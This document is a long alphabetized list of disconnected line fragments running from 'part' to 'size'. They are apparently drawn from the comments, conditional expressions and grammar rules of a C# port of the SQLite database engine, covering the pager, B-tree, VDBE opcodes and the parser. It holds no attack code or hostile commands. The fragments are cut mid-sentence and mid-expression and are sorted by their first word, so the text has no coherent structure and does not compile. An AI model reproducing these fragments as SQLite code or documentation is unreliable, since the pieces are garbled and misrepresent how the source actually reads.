 part of system initialization by the sqlite3_initialize() function.
 part of system shutdown by the sqlite3_shutdown() function. The
 part of the build process.
 part of the global LRU list.
 part of the in-memory representation of the database schema.
 part of the result.
 part of the sqlite3_index_info structure is left populated.
 participate in the balancing.
 particular database connection identified BtCursor.pBtree.db.
 particular lookup.  A full scan of a table with N entries should have
 particular table is stored in a particular register.
 pass information into and receive the reply from the [xBestIndex]
 pass the pointer to the result table to sqlite3_free_table() in order to
 passed as the first argument. They may be retrieved using the
 passed as the first function argument.
 passed as the fourth argument
 passed in.  An SQLITE_ status code is returned.  If an error occurs
 passed to an sqlite3PagerCommitPhaseOne() call.
 passed to keep OP_OpenRead happy.
 passing it to [sqlite3_close()] when it is no longer required.
 past pPager.journalOff is off-limits to us.
 past the end of a page boundary and causes SQLITE_CORRUPT to be
 past the end of the first SQL statement in zSql.  These routines only
 past the end of the key value. 
 past the last entry in the table or sqlite3BtreePrev() moves past
 pathname into zOut[].  zOut[] will be at least pVfs.mxPathname
 pattern.  The compiled regular expression can be reused on multiple
 payload fraction for a LEAFDATA tree is always 100% (or 255) and it
 pbegin == 0)
 pbegin > 0)
 pc 
 pc < p.nOp )
 pc <= iCellLast)
 pc == 0 )
 pc > iCellLast)
 pc>iCellLast ){
 pcache 
 pcache1.nCurrentPage > pcache1.nMaxPage )
 pcache1.nCurrentPage >= pcache1.nMaxPage
 pcache1.pFree != null )
 pcache1.pLruTail != null 
 pcache1.pLruTail != null )
 pcache1.pLruTail != pPage )
 pcache1ResizeHash( pCache ) != 0 )
 perfectly adequate for the overwhelming majority of applications
 performance advantage to be gained by passing an nByte parameter that
 performance. 
 performed by these routines include allocation or deallocation
 performed in the order specified:
 performed on a live database without preventing other users from
 permitted to use any of these routines.
 persistent changes to registers P1 and P3.
 persistent.
 pgno != PAGER_MJ_PGNO( pPager ) )
 pgno (which we call pPgOld) though that page is allowed to be
 pgno <= iLastPg) 
 pgno <= sqlite3BitvecSize(pBt.pHasContent))
 pgno == PAGER_MJ_PGNO( pPager ) )
 pgno == ovfl)
 pgnoOvfl == PENDING_BYTE_PAGE(pBt)
 pgnoRoot is the page that will be used for the root-page of
 phase to verify that the user has read and/or write access permission on
 placeholders for values that are [sqlite3_bind_blob 
 places.
 platforms.
 playback_one_page() will think that the page needs to be restored
 played back.
 playing back the hot-journal so that we don't end up with
 plus 2 bytes for the index to the cell in the page header).  Such
 plus_num ::= plus_opt number 
 pnEntry is the number of entries already in use.  pnAlloc is
 pnext > 0)
 pnoCase ) 
 point 
 point number. 
 point precision mode other than /fp:precise.  From the MSDN
 point to a structure that may contain arguments or space in which to
 point to that string.
 pointed to by its 3rd parameter as the metadata for the N-th
 pointed to by pCur have been zeroed by the caller.
 pointed to by the 2nd parameter are taken as the application-defined
 pointer
 pointer array and the cell content area.
 pointer at the same time.  There is a race
 pointer copied.
 pointer for the collation sequence named zName
 pointer given in its 3rd parameter.
 pointer if any kind of error was encountered.
 pointer if the array was resized.
 pointer instead of a [sqlite3_stmt
 pointer of each autoincrement table to record some side information that
 pointer of the divider cell 
 pointer or an [sqlite3] object pointer obtained
 pointer pointing to the new page.
 pointer that is passed to the callback when it is invoked.
 pointer through into calls to [sqlite3_result_int 
 pointer to an 8-byte aligned memory buffer to use for lookaside memory.
 pointer to it.
 pointer to the function to invoke is passed as the fourth parameter
 pointer to this structure.  The Expr.iColumn field is the index in
 pointer types (i.e. FuncDef) defined above.
 pointer which
 pointer-map data instead of reading the content of page ovfl to do so.
 pointer.
 pointer.  Subsequent calls to [sqlite3_errcode()] will return
 pointer. If an error occurs (out of memory or missing collation
 pointers for backlinks
 pointers to C-language functions that implement the SQL function or
 pointers to free-list leaves. The first leaf becomes a trunk
 pointing to the entry that matches.
 pointing to the record if it exists.
 pointing.  The meaning of the integer written into
 points (ex: ARM7) then swap the lower 4 bytes with the
 points at. This is the right-child if (iIdx==pPage.nCell).
 points to a linked list of these structures.
 points to the first interior cell that it points to the parent of
 points to the same BtShared object.  The database cache and the
 points to the table name and the pTable points to the database name.
 policy for Mem.z.  The MEM_Term flag tells us whether or not the
 popping the data from the stack.
 populated by sqlite3_create_module() 
 portability layer.
 portability you should omit LFS.
 portion of the buffer copied into by this function.
 position in the file to another as part of autovacuum.  When a page
 position in the index.
 possible that they return invalid values.
 possible.
 potentially be used with an index if an appropriate index exists.
 pp != pPage 
 pp = 
 ppOrderBy != null )
 ppOrderBy != null ) 
 ppOrderBy : null )
 ppOrderBy is set to NULL.  This is an optimization that prevents an
 ppPage is set to zero.
 ppStmt == null )
 ppStmt may not be NULL.
 ppStmt==null 
 ppStmt==null )
 pre
 preceded by either TK_ON or TK_DOT and immediatedly followed by one
 precision < width - ( ( prefix != '
 precision > 0 ) precision--
 precision<length ) length = precision
 preexisting [virtual table] for the module.
 prefix and the tail then write the prefix and set the tail to all
 prefix into buf[].  But if buf[] is large enough to hold both the
 prefix on their name.
 prepared statement and column at the same time then the results are
 prepared statement for the database connection.  Return NULL if there
 prepared statement goes to run the schema cookie would fail to detect
 prepared to accommodate additional static mutexes.
 prepared.  This routine puts the finishing touches on the
 prepared] that
 preparing]
 prereqColumn ) == null )
 prereqLeft ) == 0 )
 preserve 
 preserved because of JOURNALMODE_PERSIST or JOURNALMODE_TRUNCATE.
 prevents us from positioning the cursor to its correct position.
 previous call.  Disable the authorizer by installing a NULL callback.
 previously SQLITE_CONFIG_CHUNKALLOC 12 which is now unused. 
 previously entered by the same thread.  The behavior
 previously entered by the same thread.  {A17032} The behavior
 previously inserted as part of set X (only if it was previously
 previously inserted into the RowSet.
 previously invoked sqlite3ResolveExprNames() on the expression.  See
 previously obtained from xMalloc or xRealloc.  The allocated size
 previously returned [SQLITE_ERROR] or [SQLITE_DONE].  Or it could
 previously rolled back out of the main journal (and are hence in pDone)
 previously selected at compile-time or start-time.
 previously set handler.  Note that calling [sqlite3_busy_timeout()]
 primitives are constant time.  The cost of DESTROY is O(N).
 print I/O tracing messages.
 printed on stderr on the way into and out of sqlite3VdbeMemTranslate().
 prior application-defined functions that are an exact match for the
 prior to assigning a new string to zErrMsg.  After the error message
 prior to calling this routine.
 prior to returning.
 prior to the comparison.  This make the opcode work like IdxGT except
 prior_c > 0 )
 private Btree object for the file and each of those Btrees points
 probabilistic algorithm
 probability of damage to near zero but with a write performance reduction.
 problems to worry about than running out of memory.  So there is not
 procedure that follows.  Just be sure not to block.
 procedures use this information to make sure that indices are
 proceed because it is blocked by the first.  If both processes
 proceed with the special handling.
 proceed.
 process has it open.  Sometimes a virus scanner or indexing program
 process of being overwritten.  
 process that requests an EXCLUSIVE lock may actually obtain a PENDING
 process to come along will be able to rollback the database.
 processed 
 processing (in sqlite3GenerateConstraintChecks()) as part of
 processing aborts before entering this routine. 
 processing is much simpler since there is only a single row
 processing of the VDBE program is interrupted.
 processor and returns that value.  This can be used for high-res
 produces a single row of the SELECT on each invocation.  The
 produces larger code.
 profile function is returned.
 profile is a pointer to a function that is invoked at the conclusion of
 profiling.
 program counter to 0 to ensure that when the statement is
 program using one of these routines.
 program.
 programs obsolete.  Removing user-defined functions or collating
 progress callback - that is invoked periodically during long
 properly.
 properties of the blocked connections list:
 property on the expression is set.
 property.  Usually only a few pages are meet either condition.
 provide only to avoid breaking legacy code.  New aggregate function
 provided to support rare applications with unusual needs.
 provides implementations for these routines when it is compiled
 pseudo table is closed (or a new row is inserted into it).
 pseudo-table 
 psize 
 psize)
 public IdList b
 public Token key
 public int mask
 purpose is to be a placeholder function that can be overloaded
 purpose of this call is to reset the internal state of the pager
 purpose of this is to allow access to the sqlite_master table
 purpose.
 purposes only - to make sure the transfer optimization really
 purposes while a backup operation is underway or being initialized.
 purposes.  The first parameter is an operation code that determines
 pushOntoSorter() would have cleared p.iLimit 
 put in an SrcList structure because some of the subroutines we
 pzErrMsg != null )
 pzOriginCol != null )
 queries.
 query 
 query concludes.
 query of the form
 query plan for this element of the FROM clause 
 query:
 quickly for terms that match any of several different operators.
 quote(name) 
 r < 7 )
 r <= iEnd )
 r <= iTo ) return 1
 r.rowid == R )
 rI < r.nField 
 rI]
 rNotFound is already populated.
 rRounder )
 ra < r.nField 
 ra]
 raise an SQLITE_MISMATCH exception.
 raise an SQLITE_TOOBIG exception and return NULL.
 raisetype ::= ABORT 
 raisetype ::= FAIL 
 raisetype ::= ROLLBACK 
 random initial value (pPager.cksumInit) and every 200th byte
 random so two separate readers can probably access the file at the
 randomness any more.  But we will leave this code in all the same.
 randomu8() )
 range (if any).
 range of characters can be specified using '-'.  Example:
 range of data that is being read (eOp==null) or written (eOp!=null).
 range of dates.
 range of text beginning with pStart and going to the end of pEnd.
 rare larger cases can be handled by the slower 64-bit varint
 rather than a 64-bit float.  Frank assures us that the code here
 rather than a void
 ratio - 1 ) / ratio
 raw key data = (dwMagic (4 bytes) 
 rc != 0 )
 rc != SQLITE_BUSY 
 rc != SQLITE_BUSY )
 rc != SQLITE_DONE )
 rc != SQLITE_IOERR_SHORT_READ )
 rc != SQLITE_LOCKED )
 rc != SQLITE_OK )
 rc != SQLITE_OK)
 rc != SQLITE_READONLY /
 rc != SQLITE_ROW 
 rc < aMsg.Length 
 rc == SQLITE_BUSY 
 rc == SQLITE_DONE 
 rc == SQLITE_DONE)
 rc == SQLITE_ERROR
 rc == SQLITE_IOERR_NOMEM )
 rc == SQLITE_LOCKED_SHAREDCACHE)
 rc == SQLITE_MISUSE
 rc == SQLITE_NOMEM )
 rc == SQLITE_OK
 rc == SQLITE_OK 
 rc == SQLITE_OK )
 rc == SQLITE_OK ) 
 rc == SQLITE_OK)
 rc == SQLITE_OK) 
 rc!=SQLITE_BUSY 
 rc!=SQLITE_IGNORE ){
 rc2 : rc )
 rc2 == SQLITE_IOERR )
 rc==0 here means that one of the keys ran out of fields and
 rc==SQLITE_IOERR_NOMEM ) pCheck.mallocFailed = 1
 rc==SQLITE_NOMEM )
 rc==SQLITE_NOMEM)
 rc==SQLITE_OK 
 rc==SQLITE_OK )
 rc==SQLITE_OK ){
 rc==SQLITE_OK){
 rc==SQLITE_SCHEMA )
 rcauth == SQLITE_DENY 
 rcauth == SQLITE_IGNORE )
 re-evaluated for each reference to it.
 reacquire the read lock 
 read beginning at data if this is true 
 read by calls to backup_remaining() and backup_pagecount().
 read cursors on the table.  Open write cursors are moved to the
 read into internal hash tables.
 read or write transaction).  Check to see if the database
 read should occur at that point.
 read transactions be started before anything else happens in
 read-lock on iTab will suffice. Return 1 if any of these are found.  
 read-only and may not be written.
 read-only.
 read/write cursors with cursor number baseCur
 readOnly 
 readers from attaching to the database but is unsufficient for us to
 reading data from the database file.
 reading page 1 it discovers that the page-size of the database
 reading the journal this value tells SQLite to assume that the
 real IO.
 really a single row that represents the NEW or OLD pseudo-table of
 really are equivalent.  If we cannot prove that the expressions are
 really needed.
 reason.  So we run it once during initialization.
 recent call to sqlite3_backup_step().
 reclaim memory from this pager-cache.
 recommend.  Statements expire when things happen that make their
 recommended for all new programs. The two older interfaces are retained
 record and then call BtreeMovetoUnpacked() to do the work.
 record every database that needs its schema verified in the
 record header if the record header does not fit on a single page
 record header in most cases.  But they will fail to get the complete
 record into a UnpackedRecord structure.  Return a pointer to
 record is written to the following sector (leaving a gap in the file
 record number is a randomly generate integer created by NewRowid
 record number.  This P3 mechanism is used to help implement the
 record of the table. The xConnect() method is not called until
 record than SetNumColumns indicated there are columns in the
 record-length (a variable length integer at most 32-bits in size)
 record.
 records the previous output.  mem[regPrev] is a flag that is false
 recursive calls might also be possible.
 recursive mutexes on most Unix systems.  But Mac OS X is different.
 redefined.  The UNION ALL operator uses this property to force
 redirected throught the global sqlite3_api structure.
 reduce or during error processing or when a parser is
 reduce the applications ability to prioritize multiple
 reduced API.
 refact ::= CASCADE 
 refact ::= RESTRICT 
 refact ::= SET DEFAULT 
 refact ::= SET NULL 
 refarg ::= MATCH nm 
 refarg ::= ON DELETE refact 
 refarg ::= ON INSERT refact 
 refarg ::= ON UPDATE refact 
 refargs ::= 
 refargs ::= refargs refarg 
 refer to the subquery even after flattening.  Ticket 
 reference has type DbPage
 reference row.  Note that if there is an INTEGER
 reference the index.
 reference. It is the responsibility of the caller to call releasePage()
 referenced Expr plus one.
 referenced by other tables in the join.
 referenced table row is propagated into the row that holds the
 references are not valid
 references to pointer-map pages.
 references to the iParent in the outer query.
 references.
 references. 
 references. If new.
 referring to a target in another database.  An exception is when the
 refers to.
 reflect this.
 reflected in subsequent calls to [sqlite3_errcode()] or [sqlite3_errmsg()].
 reg(2) will count entries 
 reg(P3) is NULL then take the jump.  If the SQLITE_JUMPIFNULL
 regBase
 regOut.  The key with be for index pIdx which is an index on pTab.
 regReturn is the number of the register holding the subroutine
 reg[1] holds errors left 
 regardless of the success or failure of this routine.
 regardless of whether or not the input SQL is complete.
 register P1 by the value in register P2 and store the result in P3.
 register P1 the text of an error message describing any problems.
 register P1.  See the Lt opcode for additional information.
 register P2
 register P2 and store the result in register P3.
 register P2.
 register P3 and fall through to the next instruction.  
 register an alternative page cache implementation by passing in an 
 register holding first column to insert 
 register if it is convenient to do so.  The calling function
 register number containing the result of the subquery.  If the
 register still contains the true (1) value written to it earlier.
 register used by the autoincrement tracker.
 register variables.  This routine sets the pMem.enc and pMem.type
 register.
 register. 
 registered for an unlock-notify callback on the conclusion of connection
 registered the application defined function.
 registered the application defined function. {END}
 registered. {END}  The application defined collation routine should
 registers P2..P2
 registers for inputs.  Variable pOut points to the output register.
 registers holding insert rowid 
 registers identified by aRegIdx[].  No index entry is created for
 registers starting with iStart.
 registers that holds the elements of the index key.  The
 registers to indicate the presense or absence of NULLs on the RHS.
 regression tests can determine whether or not the optimizer is
 regular B-Tree table or a virtual table.
 regular file-name. In this case the auto-vacuum applies as per normal.
 rejected with an error.  If the authorizer callback returns
 related to the set of unblocked database connections.
 release it now.
 release of SQLite.
 release or rollback an SQL savepoint.
 release the memory that was malloced.  Because of the way the
 release the mutexes on btrees that were acquired at the
 released by [sqlite3_free()].  Both routines return a
 released when all cursors are closed.  If this instruction attempts
 remember the column indices.
 removal 
 remove the BtShared structure from the sharing list.  Return
 remove the entry from the db.aDb[] array. i.e. put everything back the way
 remove the table or index from the database file.
 removeFromSharingList(pBt))
 removed.
 removes the reference to the cell from pPage.
 reorder rootpages.  So it is not sufficient just to save
 repeat count on the prior instruction rather than making a new
 replace the cell deleted from the internal node. This is slightly
 representation (blob and NULL do not get converted) but no string
 representation.
 representations of the value stored in the Mem struct.
 request is matched. A higher value indicates a better match.
 requested collation sequence is not available in the database native
 requested from the operating system is returned.
 requested lock may not be obtained.
 required collation sequence.
 required for this VdbeCursor structure. It is convenient to use a
 requires the 
 requiring a journal-sync before it is written.
 requiring any dynamic allocation. This is sub-optimal because
 res != 0 )
 res == 0 )
 res == 1 )
 res might be negative because the table is empty.  Check to
 res.nAlloc )
 reserved for working around a windows/posix incompatibility). It is
 reset back down to the current value.
 reset out from under us.
 reset the interrupt flag.  This prevents a call to sqlite3_interrupt
 reset to NULL each time the b-tree is repopulated. This allows the
 resized using sqlite3Realloc().
 resolve all identifiers by associating them with a particular
 resolve the result-set expression list.
 resolve unqualified table references.
 resolved by the time the WHERE clause is resolved.
 resolvetype ::= IGNORE 
 resolvetype ::= REPLACE 
 resolvetype ::= raisetype 
 resources associated with the backup operation. If sqlite3_backup_step()
 respective compile time maximum limits.
 respectively.
 respectively.  Autocommit mode is on by default.
 responsibility of the caller to eventually release the structure
 rest of the journal file contains valid page records. This assumption
 restarted by the next call to sqlite3_backup_step(). If the source 
 restore the database to its original form.  Two conditions must be
 restored.
 result : 0 )
 result codes with this before returning 
 result in a coredump.
 result in undefined behavior.
 result is left on the stack.  For constraints of the form X IN (...)
 result of the aggregate is stored back into pMem.
 result row of a query.  In every case the first argument is a pointer
 result set expression (as determined by the ExprList.a.iCol field)
 result set in pEList.
 result set of a [SELECT] or the maximum number of columns in an index
 result table has 8 entries.  Suppose the result table is stored
 result-set entry.
 result-set expression in all of the following SELECT statements is
 result-set list.
 result.ToString() 
 result.ToString())
 results directly.
 results in register target.  The results are guaranteed to appear
 results in registers.  Modify pExpr so that the constant subexpresions
 results into memory obtained from [sqlite3_malloc()].
 results into the 
 results produced by the SQL statements.  The 5th parameter tells where
 results. This opcode causes the sqlite3_step() call to terminate
 return
 return ( ( c = C ) 
 return 0
 return 0.
 return 0.  Return 1 if the time and date cannot be found.
 return 1
 return FALSE.
 return SQLITE_BUSY.
 return SQLITE_OK. If there is no work to do (and therefore no
 return TRUE.  If the function is not a LIKE-style function then
 return YY_NO_ACTION.
 return address.
 return an SQLITE_CORRUPT error.  
 return an error indicating that the other VMs must complete first.
 return at its earliest opportunity. This routine is typically
 return can be used to deny an untrusted user access to individual
 return either [SQLITE_OK] or one of these two constants in order
 return false
 return non-zero.
 return non-zero.  Return zero if no errors are seen.
 return rc
 return the appropriate result code.
 return the most recently inserted opcode.
 return the next row of result.
 return the number of unicode characters in pZ up to (but not including)
 return the pColl pointer to be deleted (because it wasn't added
 return true
 return true so that one does not get spurious assertion failures.
 return val
 return value at EDX:EAX
 return value indicates that the rowid cache is invalid and should be
 return value is zero.
 return value with EP_Reduced
 return value. A single allocation is used to store the WhereInfo
 returned and 
 returned by sqlite3_column_type() is only meaningful if no type
 returned by sqlite3_db_handle is the same [database connection] that was the first argument
 returned from sqlite3OsCurrentTime().  This is used for testing.
 returned if it does.
 returned if this statement was compiled using the legacy
 returned in 
 returned include overflows because the requested allocation was too
 returned instead.
 returned is unpredictable and not meaningful.
 returned result set of that [SELECT] is a table column (not an
 returned string is obtained from malloc().
 returned to the caller of the pager API function.
 returned value includes allocations that overflowed because they
 returned when there is already a read-lock in order to avoid a deadlock.
 returned.
 returned. This pointer may be used with the sqlite3_backup_step() and
 returning control to the user) that has called sqlite3_malloc or
 returns (void 
 returns NULL if the page is not in cache or if a disk I/O error
 returns SQLITE_OK.
 returns a different mutex on every call.  But for the static
 returns a different mutex on every call.  {H17034} But for the static
 returns a pointer to its buffer instead of the number of
 returns an error message:
 returns the number of TCHARs written to the output
 returns true if there exist one or more cursors open on the table
 reusing pPg.
 reverts to the last value inserted before the trigger fired.
 rewinding so that the global variable will be incremented and
 right   
 right-hand side of IN is SELECT 
 right-most child page then pCur.idx is set to one more than
 right-most sibling might be nearly empty.  This block of code attempts
 right.
 roll back. See comments for function writeMasterJournal() in pager.c
 roll it back.
 rollback (see pagerPlaybackSavepoint()).
 rollback by the expiration of the BLOB.  Such changes will eventually
 rollback the whole transaction.  For operations where all constraints
 rollback.
 rolled back because a commit callback returned non-zero.
 rolled back the first time it is encountered in either journal.
 rolled back].
 root of the table.
 root page of the new table should go. meta[3] is the largest root-page
 root page.
 root page. If an open cursor was using this page a problem would
 root pages contiguous at the beginning of the database.  The former
 root-node and 3 for all other internal nodes.
 root-page of a table or index in database iDb has changed from iFrom
 rooted at page 1 of a zero-byte database.  
 rootpage==iFrom have been converted to have a rootpage of iTo
 round up. In this case the call to sqlite3OsTruncate() below will
 routine did all the work of writing information out to disk and flushing the
 routine generates the code needed to do that.
 routine goes through and adds the types and collations.
 routine has to do is delete or truncate or zero the header in the
 routine is a no-op.
 routine is called after identifier resolution.
 routine is intended to get memory to old large transient data
 routine is not threadsafe.  But it is safe to invoke this routine
 routine leaves an error message in pParse.zErrMsg where
 routine make a copy of the result set column as the argument to the
 routine may not be called again.
 routine returns a NULL pointer.
 routine returns the number of bytes in that BLOB or string.
 routine simply stores NULLs in all of those memory cells.
 routine takes care of freeing the sqlite3_index_info structure after
 routine to return SQLITE_ERROR.
 routine undoes the effect of sqlite3_os_init().  Typical tasks
 routine when their insertion fails.  When INSERT OR REPLACE
 routine will discover that the journal file is not really hot and
 routine with mask==0.
 routine.
 routine. Balancing routines are:
 routines and redirected to xFree.
 routines as they walk the parse tree to make database references
 routines have been called and that this variable remain unchanged
 routines make a private copy of the error message text before
 routines specified in the sqlite3_mem_methods object.
 routines that actually work. If the implementation does not provide working
 routines will be called to add more information to this record.
 routines with a wrapper that simulations memory allocation failure or
 routines with a wrapper used to track mutex usage for performance
 routines.
 row being deleted.
 row is returned by this routine as long as the trigger is running.
 row of data.  Any attempt to write a second row of data causes the
 row of results comes from selectA or selectB.  Also add explicit
 row of the SELECT can be written directly into
 row of the left table of the join.
 row or one of the rows being modified.
 row output from the sorter so that the row can be decomposed into
 row without seeking the cursor. This can be a big performance boost.
 row.
 row.  This can be NULL to have the virtual table select the new
 rowid <= pLast.v )
 rowid and the content to be inserted.
 rowid for itself.  The subsequent elements in the array are
 rowid iRow is being replaced or deleted. In this case invalidate
 rowid of the entry that the index refers to.
 rowid of the sub-select or view. This expression is legal (see
 rowid that appears as the last column in every index.
 rowid<EXPR and/or rowid>EXPR 
 rowid=EXPR or rowid IN (...) 
 rowidChng )
 rows of the table the index will select.  If D is the count of distinct
 rows.  Indices are selected and used to speed the search when doing
 run the outer query on that temporary table.  This requires two
 run without using temporary table for the results of the SELECT.
 run.
 running in exclusive mode) or if the transaction does not require a
 running prior to the sqlite3_interrupt() call.  New SQL statements
 running statements reaches zero are interrupted as if they had been
 running with SQLITE_DEBUG defined the SQLite code sometimes assert()s
 runtime criteria to use the operation:
 s2 
 s3 ) ) != 0 
 s: p0<<14 
 s: p0<<21 
 sAggInfo for all TK_AGG_FUNCTION nodes in expressions of the
 sCheck.mxErr != 0
 sCost.rCost < bestPlan.rCost )
 sEnd.z[0] != '
 sNC.hasAgg != 0 )
 safely ignore the index on the permanent table.
 same [prepared statement] in different threads at the same time.
 same amount of free space. Usually a single sibling on either side of the
 same as ... 
 same as EXCLUSIVE_LOCK 
 same as RESERVED_LOCK 
 same as ROLLBACK for DEFERRED keys.  SETNULL means that the foreign
 same as SHARED_LOCK 
 same as TK_AND      
 same as TK_AND=  
 same as TK_BITAND   
 same as TK_BITNOT   
 same as TK_BITOR    
 same as TK_BITOR=
 same as TK_CONCAT   
 same as TK_EQ       
 same as TK_EQ=   
 same as TK_FLOAT    
 same as TK_FLOAT=
 same as TK_GE       
 same as TK_GE=   
 same as TK_GT       
 same as TK_GT=   
 same as TK_ISNULL   
 same as TK_LE       
 same as TK_LE=   
 same as TK_LSHIFT   
 same as TK_LT       
 same as TK_LT=   
 same as TK_MINUS    
 same as TK_MINUS=
 same as TK_NE       
 same as TK_NE=   
 same as TK_NOT      
 same as TK_NOT=  
 same as TK_NOTNULL  
 same as TK_OR       
 same as TK_OR=   
 same as TK_PLUS     
 same as TK_PLUS= 
 same as TK_REM      
 same as TK_REM=  
 same as TK_RSHIFT   
 same as TK_SLASH    
 same as TK_SLASH=
 same as TK_STAR     
 same as TK_STAR= 
 same as TK_STRING   
 same as TK_TO_BLOB  
 same as TK_TO_INT   
 same as TK_TO_NUMERIC
 same as TK_TO_REAL  
 same as TK_TO_TEXT  
 same as a SELECT with only a single table in the FROM clause.)  For
 same as the sqlite3_changes() API function.
 same column more than once cannot be an error because that would
 same context that was returned on prior calls.
 same for both.
 same integer value that would be used in the SQL statement to indicate
 same job as this routine except it takes a pointer to the trigger
 same order that it is executed.
 same schema version.
 same sqlite
 same table is autoincremented multiple times due to inserts within
 same table on both sizes of the ==) cannot be optimized.
 same time as another thread is invoking sqlite3_backup_step() it is
 same virtual table.  The sqlite3_index_info structure is created
 sanity checking data is an attempt to discover the garbage in the
 satisfied.
 satisfy case 1.  But
 satisfy the query.  This is preferable to generating a new
 save the payload in the pC.aRow cache.  That will save us from
 save the state of the cursor.  The cursor must be
 saveCursorPosition().
 saveSqlFlag == 0 )
 savepoint and statement transaction in the system. All such structures
 savepoint.
 savepoints are set. This means if the page is made writable at any
 savepoints nested inside of the savepoint being operated on. 
 scanning through all values on the right-hand side of the IN.
 scenario is that one end or the other of the record will be changed.
 schema associated with the database file are all contained within
 schema change has occurred.  That detail is handled by the
 schema changes and if those schema changes are subsequently rolled
 schema consistent with what is on disk.
 schema hash tables and therefore do not have to make any changes
 schema is already loaded into the symbol table.
 schema is changed.  Ticket 
 schema may contain references to objects in other databases.
 schema of database iDb before the SQL statement runs. The schema
 schema on any databases.  This can be used to position the OP_Goto
 schema version) and make sure it is equal to P2.
 schema). Open a statement transaction if the table is a virtual
 schema-cookie mismatch occurs.
 schema. This is because each database connection requires its own unique
 sclp 
 sclp ::= 
 sclp ::= selcollist COMMA 
 scratch memory.  There are three arguments:  A pointer an 8-byte
 searches the list.  Neither the application code nor the VFS
 searching those tables.
 second form attempts to change this setting.  Both
 second parameter (pExpr) is the first argument to this function.
 second parameter is one of the [limit categories] that define a
 second parameter passed to sqlite3_backup_step(). If nPage is a negative
 second parameter to the callback is an integer code that specifies
 second parameter.  The memory allocation to be resized is the first
 second parameter.  The third parameter is a pointer to
 seconds since 1970.  Convert to a real julian day number.
 see if it is a column in a virtual table.  This is done because
 see if it is possible to delete the master journal.
 see if this is the case.
 see if those actions are allowed.  The authorizer callback should
 see the internals of this structure and only deals with pointers to
 seek opcodes.  It depends on a particular ordering of TK_xx
 seeking the table cursor to the record corresponding to the current
 seems to make a big difference in determining how fast this beast
 seen combinations of the N values.  A new entry is made in iTab
 seen.  Reg(P1) is updated with the number of errors remaining.
 sees a DELETE statement inside the body of a CREATE TRIGGER.
 sees an UPDATE statement inside the body of a CREATE TRIGGER.
 selcollist 
 selcollist ::= sclp STAR 
 selcollist ::= sclp expr as 
 selcollist ::= sclp nm DOT STAR 
 select 
 select ::= oneselect 
 select ::= select multiselect_op oneselect 
 select as the next output row of the compound select.
 select list of a SELECT statement) that may cause a malloc() failure. If
 select random [ROWID 
 select statements in the compound sub-query.
 selectB) there are 7 subroutines:
 selectNodeIsConstant will disallow 
 selected plan may still take advantage of the tables built-in rowid
 seltablist 
 seltablist ::= stl_prefix LP select RP as on_opt using_opt 
 seltablist ::= stl_prefix LP seltablist RP as on_opt using_opt 
 seltablist ::= stl_prefix nm dbnm as indexed_opt on_opt using_opt 
 semicolon-separated SQL statements in the zero-terminated UTF-8
 sensitive.  GLOB is always case sensitive.
 sent to sqlite3GenerateConstraintChecks().  There are either
 separate databases controlled by JavaScript applications downloaded
 separate indices to find rowids for each subterm and composing
 separate instruction in the virtual machine.  If we follow the usual
 sequence (so that SQLite cannot call it anymore).
 sequence can be found.
 sequence function required.  The fourth parameter is the name of the
 sequence is required.
 sequence named by pToken.   Return a pointer to the revised expression.
 sequence pColl and finally blob's ordered by memcmp().
 sequences for the ORDER BY clause.
 serial data 
 serial type 
 serial-type and data blob seperately.
 serial_type > 0 )
 serializes access to the [database connection] given in the argument
 serves to verify that the offset to the start of the cell-content
 set (set by sqlite3PagerDontWrite()).
 set BtShared.db to the database handle associated with p and the
 set Parse.rc to SQLITE_SCHEMA. 
 set and the opcode is changed from TK_FUNCTION to TK_AGG_FUNCTION.
 set and we are not left justified 
 set back to prior value.  But schema changes are infrequent
 set by [sqlite3_limit]([SQLITE_LIMIT_FUNCTION_ARG]).  If the third
 set by a compile-time C preprocessor macro named 
 set for each database that is used.  Generate code to start a
 set in BtShared.pHasContent. The contents of the bitvec are cleared
 set of rows in the view that are to be added to the ephemeral table.
 set the isPending flag to 0.
 set the return value of the application-defined function to be
 set the sqlite3VdbeAddopTrace to 1 and all opcodes will be printed
 set them now.
 set to 0 and SQLITE_OK returned. If an IO error occurs while trying
 set to 0. If a journal-header is written into the main journal while
 set to 1 if the ORDER BY clause is all DESC and it is set to 0 if
 set to 2 for xDestroy method calls and 1 for all other methods. This
 set to SQLITE_ABORT and this routine will return SQLITE_ERROR.
 set to iRowid.
 set to the index of the database that the table or view is to be
 set.  This subroutine first looks at the iUseFlag.  If iUseFlag
 setMaster
 setlist 
 setlist ::= nm EQ expr 
 setlist ::= setlist COMMA nm EQ expr 
 sets all pointer-map entries corresponding to database image pages
 sets the master journal pointer in each individual journal. If
 sets their opcodes to TK_COLUMN and their Expr.iTable fields to
 setting changed.
 setting of the auth function is NULL.
 shall invoke sqlite3_os_end().
 shared b-tree databases opened using connection db are held by the 
 shared libraries that want to be imported as extensions into
 shared locks begins at SHARED_FIRST.
 shared-cache feature is enabled.
 shared-cache table level locks. If the library is compiled with the
 sharedCacheEnabled 
 sharing was enabled or disabled for each thread separately.
 should already be set correctly. 
 should be called with err_code set to SQLITE_OK and zFormat set
 should be computed based on the journal file size.
 should be one of the following values. The integer values are assigned
 should be passed into sqlite3BtreeSetSafetyLevel().  The is done
 should be returned.  The leftmost column of the result set has the index 0.
 should be written into a temporary table (template 4).  Set to
 should call sqlite3MemoryAlarm.
 should call sqlite3TransferBindings.
 should call this routine to make sure the global function exists.
 should check the return code from [sqlite3_config()] to make sure that
 should check the return code from [sqlite3_db_config()] to make sure that
 should have been put there by the sqliteOpenCb routine.)
 should hold the error number.
 should invoke sqlite3WhereEnd() with the return value of this function
 should neither be read nor written.  Even reading previously freed
 should not have a NULL value stored in 'x'. If column 'x' is
 should not use deprecated intrfaces - they are support for backwards
 should run but attempts to read the specified column will return NULL
 show local time.
 sibling might be completely empty.  This adjustment is not optional.
 sibling page j. If the siblings are not leaf pages of an
 sibling page k. If the siblings are not leaf pages of an
 side contains only references to tables to the left of the current
 side if the page is the first or last child of its parent. If the page
 signed integer value might cause an integer overflow inside of the
 significant digit of the number 
 silently truncated to the hard upper limit.
 similar in form to assembly language.  The program consists of
 simple case then too.
 simple program to access and modify the underlying database.
 simply checks whether the file exists.
 since it was last read.
 since moved into the btree layer.  
 single byte varint and the record fits entirely on the main
 single call to balance_quick() is made for each call to this
 single child page. This can only happen with the table rooted at page 1.
 single default VFS that is appropriate for the host computer.
 single file indicated.
 single index record that has already been parsed out into individual
 single table to be deleted.
 single void
 single- and double-quoted strings 
 single-byte case.  All code should use the MACRO version as
 single-quote escapes.
 single-threaded case since checking in the multi-threaded case
 size 
 size - 1
